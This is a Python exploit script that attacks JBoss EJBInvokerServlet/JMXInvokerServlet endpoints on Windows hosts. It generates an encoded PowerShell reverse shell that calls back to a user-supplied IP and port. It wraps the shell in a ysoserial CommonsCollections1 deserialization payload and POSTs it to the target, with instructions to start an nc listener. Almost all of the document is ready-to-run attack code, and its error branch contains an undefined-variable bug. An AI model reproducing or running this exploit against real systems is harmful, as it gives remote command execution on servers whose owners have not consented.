###############################################
# EJBInvokerServlet / JMXInvokerServlet exploit for Windows
# Author: Sergey Egorov
###############################################

import os
import requests
import base64
import socket
import sys

def print_usage():
	print "Usage:"
	print "\tpython %s <target url> <local ip> <reverse shell port>" % sys.argv[0]
	print "\tpython %s http://manageengine:8080/invoker/EJBInvokerServlet 192.168.124.139 4444" % sys.argv[0]
	print "\tysoserial is required, enable the download code block if needed"

if len(sys.argv) != 4:
	print_usage()
	exit()

def promote_yes(hint):
    print hint
    while True:
        ans = raw_input("[Y/n] ").lower()
        if ans == 'n':
            return False
        elif ans == 'y':
            return True
        else:
            print "Incorrect input"

# Download ysoserial

#output_jar = "ysoserial-master.jar"
#if not os.path.isfile(output_jar):
#	os.system("wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O %s" % output_jar)

# Create PS reverse shell
shell1 = "$client = New-Object System.Net.Sockets.TCPClient('%s',%s);" % (sys.argv[2],sys.argv[3])
shell2 = "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
shell = shell1 + shell2

cmd = "powershell -ep bypass -NoLogo -NonInteractive -NoProfile -enc " + base64.standard_b64encode(shell.encode("utf-16le"))

# Serialize the command
os.system("java -jar ysoserial-master.jar CommonsCollections1 '%s' > serialized_file" % cmd)

# Check if listener is started
print "[+] Please execute the following command on your host: "
print "nc -lnvp %s" % sys.argv[3]
if not promote_yes("[+] Please confirm that you have started the listener [y/n]"):
	exit(1)

# Read the result file and send it over the POST
f=open("serialized_file","rb")

headers = {
	'Content-Type': "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation",
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
            }
data = f.read()
r = requests.post(sys.argv[1], data=data, headers=headers, verify=False)

if r.status_code == 200:
	print "Success! Check the incoming reverse shell on %s" % sys.argv[3]
else:
	print "Exploit failed"
	print res.status_code
	print res.text
